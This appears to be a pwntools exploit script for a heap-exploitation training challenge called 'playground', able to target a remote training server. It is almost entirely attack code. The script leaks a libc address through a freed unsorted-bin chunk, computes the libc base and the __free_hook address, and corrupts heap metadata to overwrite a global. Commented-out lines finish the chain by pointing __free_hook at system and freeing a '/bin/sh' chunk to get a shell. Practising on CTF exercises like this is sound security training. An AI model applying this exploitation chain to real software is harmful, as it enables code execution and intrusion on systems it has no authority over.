from pwn import *

CHALL_PATH = "./playground_patch"
CHALL = ELF(CHALL_PATH, checksec=False)
LIBC = ELF("/home/merk/odc/env/libc-2.27.so", checksec=False)
COMMANDS = """
b main
brva 0x1349 
brva 0x13A0
brva 0x146A
brva 0x1551
c
"""

def malloc(c, size) :
    c.recvuntil(b"> ")
    c.sendline(b"malloc " + str(size).encode("utf-8"))
    answ = c.recvline()
    # print(f"Hex addr = {answ}")
    answ = int(answ.split(b"==> ")[1].split(b'\n')[0], 0x10)
    # print(f"Dec addr = {answ}")
    return answ

def free(c, addr) :
    print("Free ", end='')
    c.recvuntil(b"> ")
    c.sendline(b"free " + str(addr).encode("utf-8"))
    print(c.recvline().decode("utf-8"), end='')

def show(c, addr, n) :
    print("Show:")
    c.recvuntil(b"> ")
    c.sendline(b"show " + str(addr).encode("utf-8") + b' ' + str(n).encode("utf-8"))
    res = []

    for i in range(n) :
        answ = c.recvline().decode("utf-8")
        print('\t' + answ, end='')
        res.append(answ)

    return res

def write(c, addr, msg) :
    c.recvuntil(b"> ")
    c.sendline(b"write " + str(addr).encode("utf-8") + b' ' + str(len(msg)).encode("utf-8"))
    answ = c.recvline()

    if b"read" in answ :
        c.send(msg)
        print("Wrote")
        print(c.recvline().decode("utf-8"), end='')
    else :
        print(answ.decode("utf-8"), end='')

if args.REMOTE:
    c = remote("playground.training.offensivedefensive.it", 8080, ssl=True)
    # print(c.recvline())
elif args.GDB:
    c = gdb.debug(CHALL_PATH, gdbscript = COMMANDS)
    # print(c.recvline())
else:
    c = process(CHALL_PATH)

pid = c.recvline().split(b"pid: ")[1].split(b'\n')[0]
main = c.recvline().split(b"main: ")[1].split(b'\n')[0]
pid = int(pid)
main = int(main, 0x10)
print(f"pid: {pid}")
print(f"main: {hex(main)}")

CHALL.address = main - CHALL.sym["main"]
print(f"LIBC base: {hex(LIBC.address)}")

chunk = malloc(c, 0x500)
print(f"First chunk: {hex(chunk)}")

malloc(c, 0x10)
free(c, chunk)

addr = show(c, chunk, 1)[0].split(":   ")[1].split('\n')[0]
LIBC.address = int(addr, 0x10) - 0x3EBCA0
print(f"LIBC base: {hex(LIBC.address)}")

max_heap = CHALL.sym["max_heap"]
free_hook = LIBC.sym["__free_hook"]
print("max_heap addr: ", hex(max_heap))
print("free_hook addr: ", hex(free_hook))

chunk = malloc(c, 0x410)
malloc(c, 0x500)
free(c, chunk)
# print(str(max_heap))
write(c, chunk, p64(max_heap - 0x8))

chunk = malloc(c, 0x410)
# free(c, chunk)

# write(c, max_heap, p64(0xffffffffffff))
# write(c, free_hook, p64(LIBC.sym["system"]))

# chunk = malloc(c, 0x20)
# write(c, chunk, b"/bin/sh\x00")
# free(c, chunk)

c.interactive()